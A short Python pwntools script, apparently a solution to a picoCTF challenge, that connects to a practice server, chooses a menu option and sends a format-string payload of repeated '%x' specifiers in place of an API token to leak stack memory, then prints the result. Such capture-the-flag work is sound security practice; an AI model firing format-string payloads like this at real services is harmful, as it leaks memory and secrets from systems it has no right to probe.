from pwn import *
from pwnlib.util import *

r = remote('mercury.picoctf.net', 27912)
r.recvuntil(b"View my")
r.send(b"1\n")
r.recvuntil(b"What is your API token?")
x = "%x" + "%x"*40 + "\n"
r.send(bytes(x, "ascii"))
r.recvline() # token display
r.recvline() # newline
x = r.recvline() # token str

token = x[:-1].decode()

print(token)

